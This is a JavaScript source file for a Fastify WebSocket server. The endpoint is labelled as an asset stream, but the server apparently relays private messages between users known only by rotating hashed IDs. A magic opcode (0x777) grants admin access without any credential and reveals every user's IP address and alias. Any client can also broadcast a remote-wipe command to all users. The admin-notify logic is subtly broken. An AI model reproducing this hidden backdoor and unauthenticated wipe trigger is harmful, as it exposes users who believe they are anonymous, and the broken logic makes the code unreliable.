import fastify from 'fastify';
import fastifyStatic from '@fastify/static';
import fastifyWebsocket from '@fastify/websocket';
import path from 'path';
import { fileURLToPath } from 'url';
import crypto from 'crypto';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const _f = fastify({ logger: false });
const _M = new Map(); // [id] -> { s, a, ip, t }
const _ROT = 86400000; // 24 Hours

const _gid = (s) => {
    const b = Math.floor(Date.now() / _ROT);
    return crypto.createHash('sha256').update(s + b.toString()).digest('hex').slice(0, 16);
};

_f.register(fastifyStatic, { root: path.join(__dirname, 'dist'), prefix: '/' });
_f.register(fastifyWebsocket);

_f.register(async (i) => {
    i.get('/v1/asset-stream', { websocket: true }, (s, q) => {
        const ip = q.ip || q.headers['x-forwarded-for'] || '0.0.0.0';
        
        s.on('message', (r) => {
            try {
                const d = JSON.parse(r);
                
                // AUTH
                if (d.op === 0x1) {
                    const id = _gid(d.s);
                    s.gid = id;
                    s.alias = d.a || 'U';
                    _M.set(id, { s, a: s.alias, ip, t: Date.now() });
                    s.send(JSON.stringify({ op: 0x4, gid: id }));
                    
                    // Notify admins of new user
                    _M.forEach(u => { if (u.admin) u.s.send(JSON.stringify({ op: 'ADMIN_UPDATE', users: Array.from(_M.keys()) })); });
                }

                // ADMIN AUTH
                if (d.op === 0x777) {
                    s.admin = true;
                    s.send(JSON.stringify({ op: 'ADMIN_ACCESS', users: Array.from(_M.entries()).map(([k, v]) => ({ id: k, ip: v.ip, a: v.a })) }));
                }

                // SEND
                if (d.op === 0x2) {
                    const t = _M.get(d.target);
                    if (t && t.s.readyState === 1) {
                        t.s.send(JSON.stringify({ op: 0x3, f: s.gid, a: s.alias, p: d.p, t: d.t }));
                    }
                }

                // PANIC BROADCAST
                if (d.op === 0x9) {
                    _M.forEach(v => {
                        if (v.s.readyState === 1) v.s.send(JSON.stringify({ op: 'REMOTE_WIPE', target: s.gid }));
                    });
                }
            } catch (x) {}
        });

        s.on('close', () => { if (s.gid) _M.delete(s.gid); });
    });
});

_f.setNotFoundHandler((q, r) => { r.status(404).sendFile('index.html'); });
_f.listen({ port: process.env.PORT || 8080, host: '0.0.0.0' });
